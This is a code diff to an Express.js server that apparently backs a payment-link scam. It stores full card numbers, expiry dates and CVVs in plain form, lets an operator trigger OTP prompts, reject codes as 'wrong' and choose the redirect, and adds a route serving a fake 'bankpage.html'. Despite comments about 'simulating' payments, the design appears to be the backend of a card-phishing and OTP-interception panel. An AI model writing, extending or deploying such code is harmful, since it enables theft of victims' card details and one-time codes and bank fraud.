@@ -2,26 +2,36 @@ import express from 'express';
 import bodyParser from 'body-parser';
 import cors from 'cors';
 import crypto from 'crypto';
+import http from 'http';
 
 const app = express();
 app.use(bodyParser.json());
 app.use(cors());
-app.use(express.static("."));
+app.use(express.static("public"));
 
+// In-memory stores (you can later replace these with a real DB)
 const transactions = new Map();
 const paymentLinks = new Map();
 
-// Generate payment link endpoint (links to landing.html)
+// Endpoint to generate a payment link (directs to landing.html)
+// It uses the full amount as provided.
 app.post('/api/generatePaymentLink', (req, res) => {
   const { amount, description } = req.body;
+  if (!amount || isNaN(amount)) {
+    return res.status(400).json({ status: "error", message: "Invalid amount" });
+  }
+  if (!description || !description.trim()) {
+    return res.status(400).json({ status: "error", message: "Description required" });
+  }
+  // Generate an invoice ID – a unique hex string.
   const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
-  // Link directs to landing.html with pid query parameter
-  const paymentLink = `${req.protocol}://${req.get('host')}/landing.html?pid=${invoiceId}`;
-  paymentLinks.set(invoiceId, { amount, description, paymentLink, createdAt: new Date().toISOString() });
+  // Construct a link that directs to landing.html using HTTPS and passes the invoice ID
+  const paymentLink = `https://${req.get('host')}/landing.html?pid=${invoiceId}`;
+  paymentLinks.set(invoiceId, { amount: Number(amount), description, paymentLink, createdAt: new Date().toISOString() });
   res.json({ status: "success", paymentLink });
 });
 
-// Fetch payment details using pid (for landing & payment pages)
+// Endpoint to fetch payment details (for landing & payment pages)
 app.get('/api/getPaymentDetails', (req, res) => {
   const { pid } = req.query;
   if (!pid || !paymentLinks.has(pid)) {
@@ -31,7 +41,7 @@ app.get('/api/getPaymentDetails', (req, res) => {
   res.json({ status: "success", payment });
 });
 
-// Get transaction details (for success/fail pages)
+// Endpoint to get transaction details (for success/fail pages)
 app.get('/api/getTransactionDetails', (req, res) => {
   const { invoiceId } = req.query;
   const txn = transactions.get(invoiceId);
@@ -41,22 +51,23 @@ app.get('/api/getTransactionDetails', (req, res) => {
   res.json(txn);
 });
 
-// Get all transactions (for admin panel)
+// Endpoint to get all transactions (for admin panel)
 app.get('/api/transactions', (req, res) => {
   const txList = Array.from(transactions.values());
   res.json(txList);
 });
 
-// Process payment details
+// Process payment details – simulating a payment submission.
 app.post('/api/sendPaymentDetails', (req, res) => {
   const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
   const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
   const transaction = {
     id: invoiceId,
-    cardNumber, // Cleaned on client side
+    cardNumber,
     expiry,
     cvv,
     email,
+    // Make sure the amount remains exactly as sent
     amount: amount.toString().replace(/,/g, ''),
     currency,
     cardholder,
@@ -73,7 +84,7 @@ app.post('/api/sendPaymentDetails', (req, res) => {
   res.json({ status: "success", invoiceId });
 });
 
-// Show OTP for a transaction (admin command)
+// Admin command: show OTP
 app.post('/api/showOTP', (req, res) => {
   const { invoiceId } = req.body;
   const txn = transactions.get(invoiceId);
@@ -86,7 +97,7 @@ app.post('/api/showOTP', (req, res) => {
   res.json({ status: "success", message: "OTP form will be shown to user" });
 });
 
-// Mark OTP as wrong (admin command)
+// Admin command: mark OTP as wrong
 app.post('/api/wrongOTP', (req, res) => {
   const { invoiceId } = req.body;
   const txn = transactions.get(invoiceId);
@@ -131,7 +142,7 @@ app.post('/api/submitOTP', (req, res) => {
   res.json({ status: "success", message: "OTP received" });
 });
 
-// Update redirect status (admin command: success/fail)
+// Admin command: update redirect status (simulate success/fail)
 app.post('/api/updateRedirectStatus', (req, res) => {
   const { invoiceId, redirectStatus } = req.body;
   const txn = transactions.get(invoiceId);
@@ -148,6 +159,15 @@ app.post('/api/updateRedirectStatus', (req, res) => {
       ? `/success.html?invoiceId=${invoiceId}`
       : `/fail.html?invoiceId=${invoiceId}`
   });
+});
+
+// NEW: Bankpage endpoint – when admin clicks “Bankpage” in admin panel, it opens bankpage.html
+app.get('/bankpage.html', (req, res) => {
+  const invoiceId = req.query.invoiceId;
+  if (!invoiceId || !paymentLinks.has(invoiceId)) {
+    return res.status(404).send('Invalid bank page link');
+  }
+  res.sendFile(process.cwd() + '/public/bankpage.html');
 });
 
 const PORT = process.env.PORT || 3000;
